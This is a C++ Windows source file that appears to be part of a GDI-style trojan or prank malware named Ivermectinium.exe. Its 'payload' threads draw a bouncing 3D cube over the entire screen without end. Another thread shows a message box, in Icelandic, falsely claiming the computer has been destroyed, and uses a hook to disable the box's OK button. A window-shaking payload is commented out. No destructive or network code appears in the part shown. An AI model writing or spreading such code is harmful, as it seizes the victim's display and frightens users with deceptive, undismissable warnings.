#include<iostream>
#include<stdio.h>
#include<windows.h>
#include<windowsx.h>
#include<math.h>
#include<stdlib.h>
#include<time.h>
#include<conio.h>
#include<tchar.h>
#include<fstream>
#include<windef.h>
#include<memory>
#include<iosfwd>
#define PI 3.1415926535897932384626433832795028841971
#define RndRGB (RGB(rand() % 255, rand() % 255, rand() % 255))
#define genhaoeight 2.82842712474619
#pragma comment(lib,"winmm.lib")
#pragma comment(lib,"msimg32.lib")
//extern "C" WINBASEAPI HWND WINAPI GetConsoleWindow ();

using namespace std;

int red, green, blue;
bool ifcolorblue = false, ifblue = false;
typedef union _RGBQUAD {
	COLORREF rgb;
	struct {
		BYTE r;
		BYTE g;
		BYTE b;
		BYTE Reserved;
	};
}_RGBQUAD, * PRGBQUAD;
typedef struct
{
	FLOAT h;
	FLOAT s;
	FLOAT l;
} HSL;
namespace Colors
{
	//These HSL functions was made by Wipet, credits to him!(write by pankoza)
	//And I Get It To Pankoza's Oxymorphazone source code.cpp(write by coder-linjian)

	HSL rgb2hsl(RGBQUAD rgb)
	{
		HSL hsl;

		BYTE r = rgb.rgbRed;
		BYTE g = rgb.rgbGreen;
		BYTE b = rgb.rgbBlue;

		FLOAT _r = (FLOAT)r / 255.f;
		FLOAT _g = (FLOAT)g / 255.f;
		FLOAT _b = (FLOAT)b / 255.f;

		FLOAT rgbMin = min(min(_r, _g), _b);
		FLOAT rgbMax = max(max(_r, _g), _b);

		FLOAT fDelta = rgbMax - rgbMin;
		FLOAT deltaR;
		FLOAT deltaG;
		FLOAT deltaB;

		FLOAT h = 0.f;
		FLOAT s = 0.f;
		FLOAT l = (FLOAT)((rgbMax + rgbMin) / 2.f);

		if (fDelta != 0.f)
		{
			s = l < .5f ? (FLOAT)(fDelta / (rgbMax + rgbMin)) : (FLOAT)(fDelta / (2.f - rgbMax - rgbMin));
			deltaR = (FLOAT)(((rgbMax - _r) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaG = (FLOAT)(((rgbMax - _g) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaB = (FLOAT)(((rgbMax - _b) / 6.f + (fDelta / 2.f)) / fDelta);

			if (_r == rgbMax)      h = deltaB - deltaG;
			else if (_g == rgbMax) h = (1.f / 3.f) + deltaR - deltaB;
			else if (_b == rgbMax) h = (2.f / 3.f) + deltaG - deltaR;
			if (h < 0.f)           h += 1.f;
			if (h > 1.f)           h -= 1.f;
		}

		hsl.h = h;
		hsl.s = s;
		hsl.l = l;
		return hsl;
	}

	RGBQUAD hsl2rgb(HSL hsl)
	{
		RGBQUAD rgb;

		FLOAT r = hsl.l;
		FLOAT g = hsl.l;
		FLOAT b = hsl.l;

		FLOAT h = hsl.h;
		FLOAT sl = hsl.s;
		FLOAT l = hsl.l;
		FLOAT v = (l <= .5f) ? (l * (1.f + sl)) : (l + sl - l * sl);

		FLOAT m;
		FLOAT sv;
		FLOAT fract;
		FLOAT vsf;
		FLOAT mid1;
		FLOAT mid2;

		INT sextant;

		if (v > 0.f)
		{
			m = l + l - v;
			sv = (v - m) / v;
			h *= 6.f;
			sextant = (INT)h;
			fract = h - sextant;
			vsf = v * sv * fract;
			mid1 = m + vsf;
			mid2 = v - vsf;

			switch (sextant)
			{
			case 0:
				r = v;
				g = mid1;
				b = m;
				break;
			case 1:
				r = mid2;
				g = v;
				b = m;
				break;
			case 2:
				r = m;
				g = v;
				b = mid1;
				break;
			case 3:
				r = m;
				g = mid2;
				b = v;
				break;
			case 4:
				r = mid1;
				g = m;
				b = v;
				break;
			case 5:
				r = v;
				g = m;
				b = mid2;
				break;
			}
		}

		rgb.rgbRed = (BYTE)(r * 255.f);
		rgb.rgbGreen = (BYTE)(g * 255.f);
		rgb.rgbBlue = (BYTE)(b * 255.f);

		return rgb;
	}
}
COLORREF Hue(int length) {
	if (red != length) {
		red < length; red++;
		if (ifblue == true) {
			return RGB(red, 0, length);
		}
		else {
			return RGB(red, 0, 0);
		}
	}
	else {
		if (green != length) {
			green < length; green++;
			return RGB(length, green, 0);
		}
		else {
			if (blue != length) {
				blue < length; blue++;
				return RGB(0, length, blue);
			}
			else {
				red = 0; green = 0; blue = 0;
				ifblue = true;
			}
		}
	}
}
void InitDPI() {
	HMODULE hModUser32=LoadLibraryW(L"user32.dll");
	BOOL(WINAPI *SetProcessDPIAware)(VOID) = (BOOL(WINAPI *)(VOID))GetProcAddress(hModUser32,"SetProcessDPIAware");
	if (SetProcessDPIAware)
		SetProcessDPIAware();
	FreeLibrary(hModUser32);
}

DWORD xs;
void SeedXorshift32(DWORD dwSeed) {
	xs = dwSeed;
}
DWORD Xorshift32() {
	xs ^= xs << 13;
	xs ^= xs >> 17;
	xs ^= xs << 5;
	return xs;
}
struct Point3D {
	float x, y, z;
};

int MyNewDrawIcon(int x, int y, int size, HICON hIcon) {
	HDC hdc = GetDC(0);
	DrawIconEx(hdc, x, y, hIcon, size, size, NULL, NULL, DI_NORMAL);
	ReleaseDC(0, hdc);
	DestroyIcon(hIcon); DeleteObject(hIcon);
	DeleteDC(hdc);
	Sleep(1);
	return 1;
}
void DrawEllipseAt(HDC hdc, int x, int y) {
	HICON hIcon = LoadIconW(NULL, IDI_SHIELD);
	DrawIcon(hdc, x, y, hIcon);
	DeleteObject(hIcon);
}

Point3D RotatePoint(Point3D point, float angleX, float angleY, float angleZ) {
	float cosX = cos(angleX), sinX = sin(angleX);
	float cosY = cos(angleY), sinY = sin(angleY);
	float cosZ = cos(angleZ), sinZ = sin(angleZ);

	float y = point.y * cosX - point.z * sinX;
	float z = point.y * sinX + point.z * cosX;
	point.y = y;
	point.z = z;

	float x = point.x * cosY + point.z * sinY;
	z = -point.x * sinY + point.z * cosY;
	point.x = x;
	point.z = z;

	x = point.x * cosZ - point.y * sinZ;
	y = point.x * sinZ + point.y * cosZ;
	point.x = x;
	point.y = y;

	return point;
}

void Draw3DCube(HDC hdc, Point3D center, float size, float angleX, float angleY, float angleZ, float colorA) {
	Point3D vertices[8] = {
		{-size, -size, -size},
		{size, -size, -size},
		{size, size, -size},
		{-size, size, -size},
		{-size, -size, size},
		{size, -size, size},
		{size, size, size},
		{-size, size, size},
	};

	POINT screenPoints[8];

	for (int i = 0; i < 8; ++i) {
		Point3D rotated = RotatePoint(vertices[i], angleX, angleY, angleZ);
		//COLORREF color = COLORHSL(colorA);

		int screenX = static_cast<int>(center.x + rotated.x);
		int screenY = static_cast<int>(center.y + rotated.y);

		screenPoints[i].x = screenX;
		screenPoints[i].y = screenY;

		DrawEllipseAt(hdc, screenX, screenY);
	}

	POINT polyline1[5] = { screenPoints[0], screenPoints[1], screenPoints[2], screenPoints[3], screenPoints[0] };
	Polyline(hdc, polyline1, 5);

	POINT polyline2[5] = { screenPoints[4], screenPoints[5], screenPoints[6], screenPoints[7], screenPoints[4] };
	Polyline(hdc, polyline2, 5);

	POINT connectingLines[8] = {
		screenPoints[0], screenPoints[4],
		screenPoints[1], screenPoints[5],
		screenPoints[2], screenPoints[6],
		screenPoints[3], screenPoints[7]
	};
	Polyline(hdc, &connectingLines[0], 2);
	Polyline(hdc, &connectingLines[2], 2);
	Polyline(hdc, &connectingLines[4], 2);
	Polyline(hdc, &connectingLines[6], 2);
}

DWORD WINAPI Payload_3DCube(LPVOID lpParam) {
	HDC hdc = GetDC(0);
	int wdpi = GetDeviceCaps(hdc, LOGPIXELSX);
	int hdpi = GetDeviceCaps(hdc, LOGPIXELSY);
	ReleaseDC(0, hdc);
	int w = GetSystemMetrics(SM_CXSCREEN);
	int h = GetSystemMetrics(SM_CYSCREEN);
	int x = w * wdpi / 96;
	int y = h * hdpi / 96;
	int signX = 1;
	int signY = 1;
	int incrementor = 10;
	float x2 = 100.0;
	float y2 = 100.0;
	float angleX = 0.0, angleY = 0.0, angleZ = 0.0;
	float angleIncrement = 0.04;
	float colorA = 0;
	float size = 100;
	for (;;) {
		hdc = GetDC(0);

		x2 += incrementor * signX;
		y2 += incrementor * signY;

		if (x2 + 75 >= x) {
			signX = -1;
			x2 = x - 76;
		}
		else if (x2 <= 75) {
			signX = 1;
			x2 = 76;
		}

		if (y2 + 75 >= y) {
			signY = -1;
			y2 = y - 76;
		}
		else if (y2 <= 75) {
			signY = 1;
			y2 = 76;
		}


		Point3D center = { x2, y2, 0.0f };
		HPEN hPen = CreatePen(0, 1, RndRGB);
		SelectObject(hdc, hPen);
		Draw3DCube(hdc, center, size, angleX, angleY, angleZ, colorA);
		ReleaseDC(0, hdc);
		DeleteObject(hPen);
		DeleteDC(hdc);
		angleX += angleIncrement;
		angleY += angleIncrement;
		angleZ += angleIncrement;

		Sleep(20);
		colorA += 1;

		if (size >= 0 && size <= 100) {
			size += 0.5;
		}
	}
	return 0;
}
HHOOK hHook = NULL;

LRESULT CALLBACK CBTProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode == HCBT_ACTIVATE)
	{
		HWND hDlg = (HWND)wParam;
		HWND hBtnWnd = GetDlgItem(hDlg, IDOK);
		if (hBtnWnd != NULL)
			EnableWindow(hBtnWnd, FALSE);
	}

	return CallNextHookEx(hHook, nCode, wParam, lParam);
}
DWORD WINAPI msg(LPVOID lpParam)
{
	//...

	hHook = SetWindowsHookEx(WH_CBT, &CBTProc, NULL, GetCurrentThreadId());

	MessageBox(NULL, TEXT("Ivermectinium.exe hefur eyðilagt tölvuna þína."), TEXT("LambdaTechnology's message"), MB_ICONINFORMATION);

	if (hHook != NULL)
		UnhookWindowsHookEx(hHook);

	//...
	return 0;
}
/*
DWORD WINAPI WindowShake(LPVOID lpParam) {
	int R = 10;
	int PO = 0;
	srand((unsigned)time(NULL));
	while (true) {
		RECT rt;
		HWND up = GetForegroundWindow();
		GetWindowRect(up, &rt);
		PO = rand() % 4 + 1;
		if (PO == 4)
			SetWindowPos(up, 0, rt.left + R, rt.top, 100, 100, SWP_NOSIZE);
		if (PO == 3)
			SetWindowPos(up, 0, rt.left - R, rt.top, 100, 100, SWP_NOSIZE);
		if (PO == 2)
			SetWindowPos(up, 0, rt.left, rt.top + R, 100, 100, SWP_NOSIZE);
		if (PO == 1)
			SetWindowPos(up, 0, rt.left, rt.top - R, 100, 100, SWP_NOSIZE);
		Sleep(rand() % 90 + 10);
	}
}
*/